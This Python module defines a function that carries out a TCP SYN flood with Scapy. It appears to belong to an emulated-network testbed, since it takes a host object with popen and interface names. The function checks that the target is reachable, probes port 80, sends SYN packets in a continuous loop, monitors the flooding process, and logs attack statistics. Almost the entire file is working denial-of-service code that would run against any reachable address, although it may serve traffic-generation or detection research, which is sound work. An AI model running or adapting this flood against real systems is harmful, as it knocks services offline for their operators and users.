import time
import subprocess
import signal
import logging
import uuid
import threading
import psutil
from scapy.all import Ether, IP, TCP, sendp, sr1, ICMP

# Suppress Scapy warnings
import warnings
warnings.filterwarnings("ignore", message="Mac address to reach destination not found.*")
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Configure logging for this module
attack_logger = logging.getLogger('attack_logger')

def run_attack(attacker_host, victim_ip, duration):
    run_id = str(uuid.uuid4())  # Generate a unique ID for this attack run
    start_time = time.time()
    
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Starting SYN Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Attack Phase: Traditional SYN Flood - Attacker: {attacker_host.name}, Target: {victim_ip}:80, Duration: {duration}s")
    
    # Test target reachability
    try:
        ping_start = time.time()
        ping_reply = sr1(IP(dst=victim_ip)/ICMP(), timeout=2, verbose=0)
        ping_time = time.time() - ping_start
        if ping_reply:
            attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Target {victim_ip} is reachable (ping: {ping_time:.3f}s)")
        else:
            attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Target {victim_ip} ping timeout after {ping_time:.3f}s")
    except Exception as e:
        attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Unable to ping target {victim_ip}: {e}")
    
    # Test service connectivity
    try:
        syn_start = time.time()
        syn_reply = sr1(IP(dst=victim_ip)/TCP(dport=80, flags='S'), timeout=2, verbose=0)
        syn_time = time.time() - syn_start
        if syn_reply and syn_reply.haslayer(TCP) and syn_reply[TCP].flags & 0x12:  # SYN-ACK
            attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Service {victim_ip}:80 is active (SYN-ACK: {syn_time:.3f}s)")
        else:
            attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Service {victim_ip}:80 connectivity issue (time: {syn_time:.3f}s)")
    except Exception as e:
        attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Unable to test service {victim_ip}:80: {e}")
    
    # Start the attack with enhanced monitoring
    attack_logger.debug(f"[syn_flood] [Run ID: {run_id}] Starting SYN packet generation with 0.01s interval")
    scapy_cmd = f"from scapy.all import *; sendp(Ether()/IP(dst='{victim_ip}')/TCP(dport=80, flags='S'), loop=1, inter=0.01, verbose=0, iface='{attacker_host.intfNames()[0]}')"
    process = attacker_host.popen(['python3', '-c', scapy_cmd])
    
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] SYN flood process started (PID: {process.pid})")
    
    # Monitor attack progress
    packets_sent = 0
    monitoring_interval = max(1, duration // 3)  # Monitor 3 times during attack
    next_monitor = time.time() + monitoring_interval
    
    while time.time() - start_time < duration:
        current_time = time.time()
        if current_time >= next_monitor:
            # Estimate packets sent (100 packets/second at 0.01 interval)
            elapsed = current_time - start_time
            estimated_packets = int(elapsed * 100)
            packets_sent = estimated_packets
            
            # Monitor process status
            try:
                if process.poll() is None:
                    proc_info = psutil.Process(process.pid)
                    cpu_percent = proc_info.cpu_percent()
                    memory_mb = proc_info.memory_info().rss / 1024 / 1024
                    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Attack progress: {elapsed:.1f}s elapsed, ~{estimated_packets} packets sent, Rate: {estimated_packets/elapsed:.1f} pps")
                    attack_logger.debug(f"[syn_flood] [Run ID: {run_id}] Process stats - CPU: {cpu_percent:.1f}%, Memory: {memory_mb:.1f}MB")
                else:
                    attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Attack process terminated unexpectedly")
                    break
            except Exception as e:
                attack_logger.debug(f"[syn_flood] [Run ID: {run_id}] Unable to get process stats: {e}")
            
            next_monitor = current_time + monitoring_interval
        
        time.sleep(0.1)  # Small sleep to avoid busy waiting
    
    # Stop the attack
    stop_time = time.time()
    actual_duration = stop_time - start_time
    
    try:
        if process.poll() is None:
            process.send_signal(signal.SIGINT)
            attack_logger.debug(f"[syn_flood] [Run ID: {run_id}] Sent SIGINT to SYN flood process {process.pid}")
            time.sleep(0.5)
        
        if process.poll() is None:
            process.terminate()
            attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Force terminated SYN flood process {process.pid}")
    except Exception as e:
        attack_logger.warning(f"[syn_flood] [Run ID: {run_id}] Error stopping attack process: {e}")
    
    process.wait()
    
    # Calculate final statistics
    final_packets_sent = int(actual_duration * 100)  # Estimate based on 0.01s interval
    avg_rate = final_packets_sent / actual_duration if actual_duration > 0 else 0
    
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] SYN Flood from {attacker_host.name} to {victim_ip} finished.")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Attack completed. Total packets sent = {final_packets_sent}, Average rate = {avg_rate:.2f} packets/sec.")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] --- Attack Summary ---")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Total packets sent: {final_packets_sent}")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Actual duration: {actual_duration:.2f}s")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Average rate: {avg_rate:.2f} packets/sec")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Target port: 80")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] Attack method: TCP SYN Flood")
    attack_logger.info(f"[syn_flood] [Run ID: {run_id}] --------------------")
    
    return process